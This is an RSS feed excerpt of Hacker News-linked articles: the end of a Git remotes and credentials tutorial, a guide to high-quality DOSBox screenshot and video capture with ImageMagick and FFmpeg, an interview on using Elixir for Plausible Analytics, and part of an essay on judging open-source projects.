<p><img src="https://docable.cloud/chrisparnin/examples/tutorials/resources/imgs/git-remote.png" alt="git-remote"></p>
<h4 id="remote-operations">Remote operations</h4>
<ul>
<li>Get new data: <code>git fetch &lt;remote&gt; [branch]</code></li>
<li>Upload your data: <code>git push &lt;remote&gt; &lt;branch&gt;</code></li>
<li>Get new data and merge into working tree: <code>git pull &lt;remote&gt; &lt;refspec&gt;</code></li>
</ul>
<p><em>Hot Take</em>: Avoid <code>git pull</code> on large repositories! You may want to handle merges yourself into your target branch instead of having git mess with your working tree.</p>
<p><strong>Exercise</strong>: Let’s open a terminal and perform the following steps.</p>
<p><em>Note</em>: You must be running local docable server to run these steps.</p>
<p>Windows:</p>
<p>Mac/Linux:</p>
<ol>
<li><p>Create a repo on GitHub (If you are a NCSU student, use GitHub Enterprise: <a href="https://github.ncsu.edu/">https://github.ncsu.edu</a>). </p>
</li>
<li><p>Follow the instructions on GitHub to add a remote url to an <em>existing git repository</em>. Basically, you need to run something like: <code>git remote add origin https://github.com/&lt;user&gt;/&lt;repo&gt;.git</code></p>
</li>
<li><p>Push your changes to GitHub. Verify you can see your updated README.md!</p>
</li>
<li><p>On GitHub, edit the README.md, to say “Hello GitHub!”. Commit the changes on GitHub. Now you have changes in your remote (origin), that are missing on your local copy.</p>
</li>
<li><p>Run <code>git pull</code> and verify you now have the updated changes.</p>
</li>
</ol>
<h2 id="git-branching-playground">Git Branching Playground</h2>
<p>Manipulating the commit graph can get quite complicated! This interactive visualization is very useful for getting a deeper understanding of how operations such as branches, merges, cherry-picking, and more work!</p>
<p>We will solve the “Introduction Sequence” levels in:<br><a href="http://pcottle.github.io/learnGitBranching/">http://pcottle.github.io/learnGitBranching/</a>   </p>
<p><img src="https://cloud.githubusercontent.com/assets/742934/9494425/c4dd4b66-4bd3-11e5-9aac-04bfc8fed771.png" alt="example"></p>
<h2 id="git-configuration-and-security">Git Configuration and Security</h2>
<p>If you want to make sure your commits are properly linked to your GitHub account, make sure you have configured your computer to have your name and email filled out.</p>
<pre><code>$ git config --global user.name "FirstName LastName"
$ git config --global user.email email@example.com</code></pre><p>You might also consider an authenication strategy. If you’re being asked to login everytime your pull/push to your remote repository, you might want to enable caching of your credentials. For example, you could use: </p>
<pre><code>git config --global credential.helper store</code></pre><p>However, this may store your credentials in plain text on your computer. There are other platform-specific credential.helpers that you can use to more securely store your credentials. It is also possible to generate <a href="https://help.github.com/articles/creating-a-personal-access-token-for-the-command-line/">personal access tokens</a> that you can use authenicate instead of a passcode.</p>
<p>An alternative approach is to use sshkeys. In this case, you have a public/private keypair, with the public key stored on GitHub. You then use a <a href="https://help.github.com/articles/which-remote-url-should-i-use/">different url pattern</a> for your commands such as <code>git clone</code>. Instead of the <code>https://</code> prefix, you instead use <code>git@github.com:user/repo.git</code>.</p>
<p>If you are interested in exploring this option: See these guides on GitHub:</p>
<ul>
<li><a href="https://help.github.com/articles/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent/">Generating SSH Key</a></li>
<li><a href="https://help.github.com/articles/adding-a-new-ssh-key-to-your-github-account/">Adding SSH Key to GitHub</a></li>
<li><a href="https://help.github.com/articles/testing-your-ssh-connection/">Testing SSH Connection</a></li>
</ul>

        </div>

        <!--- init and style customization not supported by css -->
        

    </div></div>]]>
            </description>
            <link>https://docable.cloud/chrisparnin/examples/tutorials/Git.md</link>
            <guid isPermaLink="false">hacker-news-small-sites-24533602</guid>
            <pubDate>Sun, 20 Sep 2020 12:25:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Good Quality DOSBox Video Capture]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24533484">thread link</a>) | @susam
<br/>
September 20, 2020 | https://susam.in/blog/good-quality-dosbox-video-capture/ | <a href="https://web.archive.org/web/*/https://susam.in/blog/good-quality-dosbox-video-capture/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>By <b>Susam Pal</b> on 01 Sep 2020</p>
<h2 id="vintage-dos-programs"><a href="#vintage-dos-programs">Vintage DOS Programs</a></h2>

<p>
Once in a while, I fire up one of the vintage DOS games or language
interpreters in DOSBox for nostalgia's sake. I have archived these
vintage programs at <a href="https://github.com/susam/dosage">github.com/susam/dosage</a>.
DOSBox is an emulator program that emulates IBM PC compatible computers
running DOS. Trying my hands on these antiquated DOS programs now evokes
old memories from my childhood days days when I first came across
computers as part of our primary school curriculum.
</p>

<p>
Computers were much simpler in those days. The ones in our school were
IBM PC compatible computers with mostly monochrome displays. A couple of
them had support for a very limited number of colours provided by CGA or
EGA graphics cards. The ability to boot a computer using a
5¼-inch floppy disk containing MS-DOS, load a Logo or BASIC
interpreter, or a computer game from another floppy disk, and then write
some programs or play a few games without any distraction had its own
charm that I find missing from modern day computing.
</p>

<p>
Often while using old DOS programs with DOSBox in this day and age, I
want to take screenshot captures or video captures of the DOSBox
sessions and share them with my friends. In this article, I will explain
how I create good quality screenshot captures and video captures of
DOSBox sessions in formats that I can share with others.
</p>


<h2 id="contents"><a href="#contents">Contents</a></h2>
<ul>
  <li><a href="#vintage-dos-programs">Vintage DOS Programs</a></li>
  <li><a href="#software-versions">Software Versions</a></li>
  <li><a href="#ibm-pc-logo-in-dosbox">IBM PC Logo in DOSBox</a></li>
  <li><a href="#digger-in-dosbox">Digger in DOSBox</a></li>
  <li><a href="#dosbox-screenshot-capture">DOSBox Screenshot Capture</a></li>
  <li><a href="#dosbox-video-capture">DOSBox Video Capture</a></li>
  <li><a href="#dosbox-audio-video-capture">DOSBox Audio/Video Capture</a></li>
  <li><a href="#dosbox-gif-animation">DOSBox GIF Animation</a></li>
  <li><a href="#references">References</a></li>
</ul>


<h2 id="software-versions"><a href="#software-versions">Software Versions</a></h2>

<p>
Since this article involves several pieces of software, some of what is
written here may not hold good in future if the behaviour of any of
these software tools change in future. The list below contains the
versions of all software tools that were used to test the commands
provided in this article:
</p>

<ol>
  <li>macOS High Sierra 10.13.6</li>
  <li>DOSBox 0.74-3</li>
  <li>FFmpeg 4.3.1</li>
  <li>ImageMagick 7.0.10-28
  </li><li>IBM Personal Computer Logo Version 1.00</li>
  <li>Digger (Original PC booter version by Windmill Software)</li>
</ol>

<p>
Note that both Logo and Digger programs in the list above are DOS
programs that were released in 1983. They cannot be run directly on
modern computers but they can be run with DOSBox since it emulates old
IBM PC compatible computers.
</p>


<h2 id="ibm-pc-logo-in-dosbox"><a href="#ibm-pc-logo-in-dosbox">IBM PC Logo in DOSBox</a></h2>

<p>
IBM Personal Computer Logo developed by Logo Computer Systems Inc.
(LCSI) in 1983 was the first piece of software I got introduced to while
learning computers as a kid. I came across it at the age of 8 when I was
in Class 4 and our school had a 5¼-inch floppy disk with IBM PC
Logo on it. As a result, Logo was the first programming language I
learnt in my life. About 20 years later, I would realize that the first
programming language I learnt is a dialect of Lisp. How wonderful!
</p>

<figure id="logo-welcome-screenshot">
  <a href="https://susam.in/files/blog/dosbox-logo-0.png"><img src="https://susam.in/files/blog/dosbox-logo-0.png" alt="A screenshot of IBM Personal Computer Logo with copyright notices of IBM and LCSI, welcome message, and question mark prompt"></a>
  <figcaption>
    Welcome screen of IBM Personal Computer Logo
  </figcaption>
</figure>

<!--
Class Age Year
   KG   4   88
    1   5   89
    2   6   90
    3   7   91
    4   8   92
    5   9   93
    6  10   94
    7  11   95
    8  12   96
    9  13   97
   10  14   98
-->

<p>
If the Logo interpreter program <code>LOGO.COM</code> exists in the
current directory, it can be run with DOSBox using the following
command:
</p>

<pre><code>dosbox LOGO.COM</code></pre>

<p>
One of the things I enjoyed drawing with Logo was a grid of overlapping
circles like this:
</p>

<figure id="logo-program-screenshot">
  <a href="https://susam.in/files/blog/dosbox-logo-1.png"><img src="https://susam.in/files/blog/dosbox-logo-1.png" alt="A grid made with 20 circles along with Logo source code for it"></a>
  <figcaption>
    Grid of circles drawn with IBM Personal Computer Logo
  </figcaption>
</figure>

<p>
Here is the Logo source code for the above output:
</p>

<pre><code>REPEAT 20 [REPEAT 180 [FD 1 RT 2] RT 18]</code>
</pre>


<h2 id="digger-in-dosbox"><a href="#digger-in-dosbox">Digger in DOSBox</a></h2>

<p>
At around the same time I learnt Logo, I also came across Digger, a
computer game for IBM PC developed by Windmill Software in 1983.
</p>

<figure id="digger-welcome-screenshot">
  <a href="https://susam.in/files/blog/dosbox-digger-0.png"><img src="https://susam.in/files/blog/dosbox-digger-0.png" alt="A screenshot of Digger welcome screen with the names and pictures of various game characters with a copyright notice of Windmill Software"></a>
  <figcaption>
    Welcome screen of Digger
  </figcaption>
</figure>

<p>
If the Digger program <code>DIGGER.COM</code> exists in the directory,
it can be run using DOSBox with the following command:
</p>

<pre><code>dosbox DIGGER.COM -c "config -set cpu cycles=500" -machine cga</code>
</pre>

<p>
The <code>-machine cga</code> option emulates a machine with Color
Graphics Adapter (CGA) because Digger requires a machine of this type to
run correctly. The <code>cycles=500</code> configuration option slows
down the speed at which DOSBox emulates instructions in order to emulate
the slow machines of olden days. Without this option, Digger runs too
fast to be able to be conveniently playable.
</p>

<figure id="digger-game-screenshot">
  <a href="https://susam.in/files/blog/dosbox-digger-1.png"><img src="https://susam.in/files/blog/dosbox-digger-1.png" alt="A screenshot of underground maze in the game of Digger"></a>
  <figcaption>
    A game of Digger that has just begun
  </figcaption>
</figure>

<p>
Digger has an excellent gameplay where the player digs through
underground tunnels to pick up emeralds, drop gold bags to release the
gold or squash nobbins and hobbins, collect the released gold to earn
more points, and so on. It uses bright and attractive colours. The music
is great. When Digger was released in 1983, it was quite advanced for
its time.
</p>



<h2 id="dosbox-screenshot-capture"><a href="#dosbox-screenshot-capture">DOSBox Screenshot Capture</a></h2>

<p>
The screenshots above were obtained by running IBM PC Logo and the
original 1983 PC booter version of Digger on DOSBox and then resizing
the screenshots such that their aspect ratio matches the aspect ratio of
old CRT computer monitors.
</p>

<p>
To obtain the screenshots, we first press <kbd>Ctrl</kbd> +
<kbd>F5</kbd> while DOSBox is running. The paths of the screenshots
appear in the console output at the terminal where DOSBox was launched.
For example:
</p>

<pre><samp>Capturing Screenshot to /Users/susam/Library/Preferences/capture/logo_000.png
Capturing Screenshot to /Users/susam/Library/Preferences/capture/logo_001.png</samp>
</pre>

<pre><samp>Capturing Screenshot to /Users/susam/Library/Preferences/capture/digger_000.png
Capturing Screenshot to /Users/susam/Library/Preferences/capture/digger_001.png</samp>
</pre>

<p>
The screenshots obtained in this manner have an aspect ratio of 8:5
which makes the output look stretched horizontally. The old CRT computer
monitors for which these old DOS programs were written had an aspect
ratio of 4:3 instead. This stretched look can be fixed by resizing the
images to an aspect ratio of 4:3. Here are the commands used to fix the
aspect ratio and produce the images:
</p>

<pre><code>convert logo_000.png -sample '1920x1440!' dosbox-logo-0.png
convert logo_001.png -sample '1920x1440!' dosbox-logo-1.png</code>
</pre>
<pre><code>convert digger_000.png -sample '1920x1440!' dosbox-digger-0.png
convert digger_001.png -sample '1920x1440!' dosbox-digger-1.png</code>
</pre>

<!--
According to Screen Resolution Statistics for January 2020 by
w3schools.com, here are the statistics of browser resolutions:

Resolution   %age  Cumulative

Lower         9.0    9.0
1280 x  720   3.9   12.9
1024 x  768   1.4   14.3
1360 x  768   1.0   15.3
1366 x  768  27.6   42.9
1280 x  800   1.8   44.7
1536 x  864   9.8   54.5
1440 x  900   5.6   60.1
1600 x  900   4.1   64.2
1280 x 1024   2.4   66.6
1680 x 1050   2.6   69.2
1920 x 1080  20.3   89.5
1920 x 1200   1.5   91.0
2560 x 1440   1.7   92.7
Other High    7.3  100.0

1440 x 1080 is strictly larger than 55.3% displays.
1600 x 1200 is strictly larger than 66.6% displays.
1920 x 1440 is strictly larger than 91.0% displays.
x 1080 >= 89.5% displays
x 1200 >= 91.0% displays.
x 1440 >= 92.7% displays
-->

<p>
The <code>convert</code> program comes with ImageMagick. There are a few
things worth noting here:
</p>

<ul>
  <li>
    We use the <code>-sample</code> option here to resize the image as
    opposed to using <code>-resize</code> or <code>-scale</code>. The
    <code>-resize</code> or <code>-scale</code> option would smooth the
    jagged edges in the text and graphics by introducing additional
    colours. The <code>-resize</code> option is great for real world
    images where we do want the edges to be smooth while scaling up or
    down but in these screenshots we want to retain the crisp and jagged
    edges that is typical of DOSBox and the old CRT monitors. Therefore
    we use the <code>-sample</code> option that does not introduce any
    new colours. Instead it uses nearest-neighbour interpolation (point
    sampling) to decide the colours of the scaled image.
  </li>
  <li>
    The <code>!</code> flag is used to ignore the aspect ratio of the
    original image. Without this flag, the output files would be
    1920x1200 in size, that is, the largest size with an aspect ratio of
    8:5 that fits in a 1920x1440 box. With this flag, the original
    aspect ratio of 8:5 is ignored and the output is exactly 1920x1440
    in size.
  </li>
</ul>

<p>
By the way, I have donated these images above to Wikimedia Commons under
the Creative Commons Attribution 4.0 International (CC BY 4.0) license:
</p>

<ul>
  <li><a href="https://commons.wikimedia.org/wiki/File:IBM_LCSI_Logo_Welcome_Screen.png">File:IBM_LCSI_Logo_Welcome_Screen.png</a></li>
  <li><a href="https://commons.wikimedia.org/wiki/File:IBM_LCSI_Logo_Circles.png">File:IBM_LCSI_Logo_Circles.png</a></li>
  <li><a href="https://commons.wikimedia.org/wiki/File:Digger_Original_PC_Booter_Version_Welcome_Screen.png">File:Digger_Original_PC_Booter_Version_Welcome_Screen.png</a>
  </li><li><a href="https://commons.wikimedia.org/wiki/File:Digger_Original_PC_Booter_Version_Game.png">File:Digger_Original_PC_Booter_Version_Game.png</a></li>
</ul>

<p>
Having the images on Wikimedia Commons helps to include these
screenshots in the Wikipedia articles on <a href="https://en.wikipedia.org/wiki/Logo_(programming_language)#Implementations">Logo</a>
and <a href="https://en.wikipedia.org/wiki/Digger_(video_game)">Digger</a>.
</p>


<h2 id="dosbox-video-capture"><a href="#dosbox-video-capture">DOSBox Video Capture</a></h2>

<p>
To start capturing video of DOSBox, we press <kbd>Ctrl</kbd> +
<kbd>Alt</kbd> + <kbd>F5</kbd>. The same key combination stops capturing
video. The following output appears in the console output to show where
the video file is saved:
</p>

<pre><samp>Capturing Video to /Users/susam/Library/Preferences/capture/logo_000.avi
Stopped capturing video.</samp>
</pre>

<p>
Say, I want to share a video capture of DOSBox with Logo running on it
with my friends who might be on devices that do not support playing AVI
files. The following FFmpeg command converts the video to a format that
can be distributed widely and played on a wide range of devices and
players:
</p>

<pre><code>ffmpeg -i logo_000.avi -an -c:v libx264 -preset veryslow \
       -crf 17 -vf format=yuv420p,scale=1920:1440:flags=neighbor,fps=30 \
       dosbox-logo.mp4</code>
</pre>

<p>
Here is what the output looks like:
</p>

<figure id="logo-video">
  <video controls="">
    <source src="https://susam.in/files/blog/dosbox-logo.mp4" type="video/mp4">
  </video>
  <figcaption>
    Video capture of IBM Personal Computer Logo
    [<a href="https://susam.in/files/blog/dosbox-logo.mp4">MP4</a>]
  </figcaption>
</figure>

<p>
Let us briefly discuss the various FFmpeg options used here:
</p>

<ul>
  <li>
    <p>
      <code>-i logo_000.avi</code>
    </p>
    <p>
      This, of course, specifies the input file.
    </p>
  </li>
  <li>
    <p>
      <code>-an</code>
    </p>
    <p>
      The audio is silent in this video, so we reduce the file size a
      little by disabling the audio stream with this option. For
      example, without this option the output file size was 317 KB but
      with this option it turned out to be 282 KB.
    </p>
    <p>
      This option should not be specified if the audio stream needs to
      preserved, for example, with DOS games that have audio. We will
      see an example of this in the next section.
    </p>
  </li>
  <li>
    <p>
      <code>-c:v libx264</code>
    </p>
    <p>
      This option selects the x264 encoder to encode the video stream
      into H.264 format. H.264 is also known as MPEG-4 Part 10, Advanced
      Video Coding (MPEG-4 AVC). Currently, it is the most popular
      format for recording, compression, and distribution of video
      content.
    </p>
  </li>
  <li>
    <p>
      <code>-crf 17</code>
    </p>
    <p>
      This option provides visually lossless output, that is, high
      quality output without any loss in quality that can be perceived
      by human eyes. For completely lossless output, we need to use the
      <code>-crf 0</code> option. However, this option sets the video
      profile to <code>High 4:4:4 Predictive</code> which prevents the
      video from playing in some video players. This issue is discussed
      in more detail in the point about <code>yuv420p</code> pixel
      format that comes later in this list. Since <code>-crf 0</code>
      cannot be used due to this issue, the next best option is
      <code>-crf 1</code> which while not completely lossless is much
      better than …</p></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://susam.in/blog/good-quality-dosbox-video-capture/">https://susam.in/blog/good-quality-dosbox-video-capture/</a></em></p>]]>
            </description>
            <link>https://susam.in/blog/good-quality-dosbox-video-capture/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24533484</guid>
            <pubDate>Sun, 20 Sep 2020 12:02:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elixir in Production: Plausible Analytics]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24533464">thread link</a>) | @ksec
<br/>
September 20, 2020 | https://serokell.io/blog/elixir-in-production-plausible-analytics | <a href="https://web.archive.org/web/*/https://serokell.io/blog/elixir-in-production-plausible-analytics">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Searching for an open-source Google Analytics alternative?</em></p><p><em>Our guest has your back. Uku Täht is the founder of <a href="https://plausible.io/">Plausible Analytics</a>, an open-source web analytics project built with Elixir. For the last couple of months, his project has attracted a lot of attention through <a href="https://plausible.io/blog/remove-google-analytics">informative blog posts</a> and very positive user reviews.</em></p><p><em>In this interview, we talk about his use of Elixir in production: the benefits, the downsides, the specifics, and why Elixir is so good for projects like Plausible Analytics.</em></p><h2 id="interview-with-uku-t%C3%A4ht">Interview with Uku Täht</h2><p><strong>Could you tell us a little about your company and your role there?</strong></p><p>Plausible Analytics is an open-source project dedicated to making web analytics more privacy-friendly. Our mission is to reduce corporate surveillance by providing an alternative web analytics tool that doesn’t have any links to AdTech.</p><p>I started building Plausible almost two years ago as a side project. I’ve been working on it full-time since the beginning of this year and I’ve also partnered up with Marko who handles the marketing and communication side of things.</p><p><img src="https://serokell.io/files/uj/ujixp3oy.2_(22)_(1).jpg" alt="ujixp3oy.2_(22)_(1).jpg"></p><hr><center><i>Uku Täht, the founder of Plausible Analytics.</i></center><p><strong>What is the key feature or set of features that make using Plausible Analytics a feasible replacement over Google Analytics?</strong></p><p>Google Analytics is overkill for most website owners. Plausible cuts through the noise by presenting all the important website traffic insights and metrics on one single page. You don’t need training or experience in web analytics to get started.</p><p>Keeping the script lightweight is also a priority. Our script is more than 17 times smaller than the Google Analytics script and more than 45 times smaller than the recommended Google Analytics integration using the Google Tag Manager.</p><p>But the biggest reason to choose Plausible is the fact that we’re committed to building open source software. The code behind our service is freely available for anyone. By using Plausible you help build software that everyone can benefit from, not just the corporations.</p><p><strong>How did Elixir as the language of choice work for you when implementing these features?</strong></p><p>I think Elixir is perfect for our use-case. It’s a very productive language once you learn it and it can also handle tons of traffic. Last month we processed 60 million pageviews with absolutely no issues.</p><p>Elixir really shines when you have stateful requirements for the app server. For example, we keep all the active sessions in memory so we don’t have to look a session up from the database on every event. It was a joy to build this part of the app using the GenServer primitives.</p><p><strong>How much did the fact that your product is not only self-hosted but also a SaaS inform your decision to go with Elixir? Did you choose it to scale a SaaS?</strong></p><p>I do believe that using Elixir allows us to make self-hosting a bit easier. In other languages, it’s common to use tools like Redis and external message queues but in Elixir we can often avoid these extra tools and keep the infrastructure requirements simple.</p><p>Plausible is currently designed to run on just one node. Once we start building out support for multi-node deployments, things will get really interesting. I feel like Elixir and the BEAM are designed perfectly for our use-case where we need multiple nodes to share state about visitors sessions.</p><p>Hopefully, we can evolve the architecture without needing extra infrastructure bits and pieces. The goal is to keep the requirements as simple as possible so everyone can run the code on their own server. By relying on BEAM fundamentals, we can probably avoid in-memoy stores, external message queues, and cluster managers altogether, making Plausible easy to self-host.</p><p><strong>Could you tell us more about your deployment: where do you host, how do you deploy, do you use the hot code reload functionality?</strong></p><p>We <a href="https://plausible.io/blog/made-in-eu">recently moved</a> from Heroku to using Digital Ocean. I wanted to eat our own dog food when it comes to the Docker infrastructure we built for self-hosting. So now we have a Digital Ocean droplet pre-configured with Docker and we just pull new images from our <a href="https://hub.docker.com/r/plausible/analytics">DockerHub</a>.</p><p>Since we have a single node deployment, we do have around 30 seconds of downtime on each deploy and we don’t have auto-scaling support. We will deal with these issues as we scale, I just wanted to be upfront about the downsides of how we’re running it.</p><p>We don’t use hot code reloading since it doesn’t play well with the Docker flow.</p><p><strong>What was the biggest challenge while developing Plausible Analytics with Elixir?</strong></p><p>We use a database called Clickhouse for storing our stats. It’s a fairly new and cutting-edge database and it doesn’t have a robust integration with Elixir yet. We use a low-level connection library which gives us random errors sometimes.</p><p>I’m thinking about taking the time to write a proper Ecto adapter for Clickhouse so we can run migrations and have better error handling. It’s easy to complain about the lack of libraries in the Elixir ecosystem but I’d like to do my part in helping the ecosystem thrive.</p><p><strong>Are you satisfied with the result?</strong></p><p>Definitely. If I could go back and do it all over, I would choose the same stack again. Elixir+Phoenix is really fun to work with and it performs even better than I expected.</p><p><strong>Any key takeaways that you would like to share with our audience?</strong></p><p>Elixir is a wonderful language and its ecosystem is really coming along. I would encourage everyone to give it a try and contribute back to the ever-growing list of libraries and frameworks to make it even more powerful.</p><hr><p>I’d like to thank Uku for the interview! If you want to see more examples of Elixir used in production, check out <a href="https://serokell.io/blog/elixir-in-production-venu">our interview</a> with one of the Venu co-founders or read our post about <a href="https://serokell.io/blog/elixir-companies">companies that use Elixir</a>.</p><p>Additionally, if you have your own Elixir in production story to tell (both good and bad), we definitely want to hear it! You are welcome to write to us: <a href="mailto:hi@serokell.io">hi@serokell.io</a>.</p></div></div>]]>
            </description>
            <link>https://serokell.io/blog/elixir-in-production-plausible-analytics</link>
            <guid isPermaLink="false">hacker-news-small-sites-24533464</guid>
            <pubDate>Sun, 20 Sep 2020 11:57:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Where's the Yelp for open-source tools?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24533402">thread link</a>) | @kiyanwang
<br/>
September 20, 2020 | https://www.functionize.com/blog/wheres-the-yelp-for-open-source-tools/ | <a href="https://web.archive.org/web/*/https://www.functionize.com/blog/wheres-the-yelp-for-open-source-tools/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><img width="1080" height="634" src="https://3laqvw22wekb3ykm8z4dbnq8-wpengine.netdna-ssl.com/wp-content/uploads/2020/09/ft-opensource-tools-yelp.jpg" alt="Where’s the Yelp for open-source tools?" srcset="https://www.functionize.com/wp-content/uploads/2020/09/ft-opensource-tools-yelp.jpg 1080w, https://www.functionize.com/wp-content/uploads/2020/09/ft-opensource-tools-yelp-300x176.jpg 300w, https://www.functionize.com/wp-content/uploads/2020/09/ft-opensource-tools-yelp-1024x601.jpg 1024w, https://www.functionize.com/wp-content/uploads/2020/09/ft-opensource-tools-yelp-768x451.jpg 768w" sizes="(max-width: 1080px) 100vw, 1080px">      </p>	  
    
        <p><strong>We’d like an easy way to judge open-source programs. It can be done. But easily? That’s another matter. When it comes to open source, you can’t rely on star power.</strong></p>
<p>The “<a href="https://www.bbc.com/future/article/20140708-when-crowd-wisdom-goes-wrong" target="_blank" rel="noopener noreferrer">wisdom of the crowd</a>” has inspired all sorts of online services wherein people share their opinions and guide others in making choices. The Internet community has created many ways to do this, such as Amazon reviews, <a href="https://www.glassdoor.com/index.htm" target="_blank" rel="noopener noreferrer">Glassdoor</a> (where you can rate employers), and <a href="https://www.tripadvisor.com/" target="_blank" rel="noopener noreferrer">TripAdvisor</a> and <a href="https://yelp.com/" target="_blank" rel="noopener noreferrer">Yelp</a> (for hotels, restaurants, and other service providers). You can rate or recommend commercial software, too, such as on mobile app stores or through sites like <a href="https://www.producthunt.com/" target="_blank" rel="noopener noreferrer">product hunt</a>. But if you want advice to help you choose open-source applications, the results are disappointing.</p>
<p>It isn’t for lack of trying. Plenty of people have created systems to collect, judge, and evaluate open-source projects, including information about a project’s popularity, reliability, and activity. But each of those review sites – and their methodologies – have flaws.</p>
<p>Take that most archaic of programming metrics: Lines of code (LoC). Yes, it’s easy to measure. But <a href="https://www.functionize.com/blog/the-myth-of-100-code-coverage/">it’s also profoundly misleading</a>. As programming genius Edsger Dijkstra observed in 1988, LoC gives people “<a href="http://www.cs.utexas.edu/users/EWD/transcriptions/EWD10xx/EWD1036.html" target="_blank" rel="noopener noreferrer">the reassuring illusion that programs are just devices like any others</a>, the only difference admitted being that their manufacture might require a new type of craftsmen, viz. programmers. From there it is only a small step to measuring ‘programmer productivity’ in terms of ‘number of lines of code produced per month.’ This is a very costly measuring unit because it encourages the writing of insipid code.”</p>
<p>We’ve gotten better since then, haven’t we? Perhaps not.</p>
<h3>First attempts</h3>
<p>In 1997, well-known developer Patrick Lenz founded the first listing and announcement site for free and open-source software, freshmeat.net. It was meant to be <em>the</em> guide to open-source programs. But freshmeat never lived up to its promise.</p>
<p>Due to changes in direction and ownership, <a href="https://jeffcovey.net/2014/06/19/freshmeat-net-1997-2014/" target="_blank" rel="noopener noreferrer">freshmeat sputtered into failure</a>. In the end, no one really had a clear idea of how to monetize the site.</p>
<p>Freshmeat was quickly followed by <a href="http://freshmeat.sourceforge.net/about" target="_blank" rel="noopener noreferrer">Freecode</a>. This site’s mission was to maintain the “<a href="https://web.archive.org/web/20111031160805/http:/freecode.com/about" target="_blank" rel="noopener noreferrer">Web’s largest index of Linux, Unix, and cross-platform software</a> and mobile applications.” It explained, “Each entry provides a description of the software, links to download it and to obtain more information, and a history of the project’s releases, so readers can keep up-to-date on the latest developments.” You could think of Freecode as an open-source software-specific version of Yahoo’s first iteration as a guide to the web.</p>
<p>Like its predecessor, the site slowly came to a stop – and then halted entirely. Its owners declared, “The Freecode site has been moved to a static state effective June 18, 2014, due to low traffic levels and so that folks will focus on more useful endeavors than site upkeep.”</p>
<p>Open-source co-creator <a href="http://esr.ibiblio.org/?p=5948" target="_blank" rel="noopener noreferrer">Eric S. Raymond tried to revive Freecode.</a> Raymond believed no other site was “quite so good for getting a cross-sectional view of what the open-source world is doing.” From his perspective, Freecode had numerous but fixable, problems. Among them: cutting down on human moderation, focusing exclusively on open-source software, and paring it down to essential features. Alas, his efforts came to little. The site remains a static antique.</p>
<h3>Case in point: GitHub</h3>
<p>Today, <a href="https://docs.github.com/en/github/getting-started-with-github/saving-repositories-with-stars" target="_blank" rel="noopener noreferrer">GitHub Stars</a> is presented as a quick, easy way to evaluate the virtues of an open-source program. <a href="https://github.com/">GitHub</a>, the biggest open-source Git repository, describes its star system as just a way to keep track of projects people find interesting. However, many developers use the stars as a way of boosting their reputations.</p>
<p>Theoretically, the more stars, the better the software. Or is it?</p>
<p>Solomon Hykes, Docker’s co-founder, strongly disagrees. “<a href="https://twitter.com/solomonstre/status/1294189350419181575?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1294189350419181575%7Ctwgr%5E&amp;ref_url=https%3A%2F%2Fwww.redditmedia.com%2Fmediaembed%2Fi9rtbb%3Fresponsive%3Dtrueis_nightmode%3Dfalse" target="_blank" rel="noopener noreferrer">GitHub stars are a scam.</a> This bullshit metric is so pervasive, and GitHub’s chokehold on the open-source community so complete, that maintainers have to distort their workflows to fit the ‘GitHub model’ or risk being publicly shamed by industry analysts. What a disgrace.”</p>
<p>Hykes isn’t the only one who views GitHub stars as a misleading flop. Fintan Ryan, a Gartner senior director, thinks <a href="https://twitter.com/fintanr/status/1294173608558952448" target="_blank" rel="noopener noreferrer">stars are just a game</a> that confuses marketing and the code that’s actually on GitHub. And Microsoft project manager for open-source development on Azure, Ralph Squillace, tweeted, “In my opinion and for Microsoft project [engineering] and management <a href="https://twitter.com/ralph_squillace/status/1294196384237785088" target="_blank" rel="noopener noreferrer">they are worthless</a>. [But] There are always people who seize on them anyway.”</p>
<p>And that’s the problem. People love easy metrics. They want a quick, one-glance <a href="https://www.functionize.com/blog/how-personality-traits-affect-the-open-source-development-process/">answer to their coding (and other) problems</a>. Spoiler alert: There is no such thing.</p>
<h3>Opening the code: Open Hub</h3>
<p>Still, some sites and services provide valuable insights into a project’s overall health. Many of those websites, such as <a href="https://github.com/features/insights" target="_blank" rel="noopener noreferrer">GitHub Insights</a>, a commercial standalone application for <a href="https://github.com/enterprise#github-one" target="_blank" rel="noopener noreferrer">GitHub One</a> customers, are restricted to project’s development managers rather than outsiders looking in on a project.</p>
<p>One service that does give everyone a look into open-source projects is <a href="https://www.synopsys.com/" target="_blank" rel="noopener noreferrer">Synopsys</a>‘s <a href="https://www.openhub.net/" target="_blank" rel="noopener noreferrer">Black Duck Open Hub</a>, formerly Ohloh. By searching on the site, anyone can dive deep into major projects to see who’s doing what in a given open-source application’s version control system.</p>
<p>While Open Hub doesn’t give you simple answers about a project, it does share such important information as security vulnerabilities per the last ten versions; the number of commits per month; and the number of recently active developers. You can determine a project’s most active developers, too. Armed with this data, you can come to <a href="https://www.functionize.com/blog/from-the-qa-trenches-6-signs-of-project-success-or-failure/">your own conclusions about a particular project’s worthiness</a>.</p>
<h3>Simple tools for complex answers: Google Trends</h3>
<p>Let’s say you want to know which open-source program is the most popular for a given need. Thanks to <a href="https://trends.google.com/trends/">Google Trends</a>, comparing projects is easier to determine than you might think.</p>
<p>For instance, one eternal open-source debate is whether <a href="https://www.openoffice.org/" target="_blank" rel="noopener noreferrer">OpenOffice</a> or <a href="https://www.libreoffice.org/" target="_blank" rel="noopener noreferrer">LibreOffice</a> is the better open-source office suite. Its relative quality may remain open to question, but by comparing searches for both programs, you can see in a jiffy that LibreOffice shows up in searches on average more than twice as often as OpenOffice.</p>
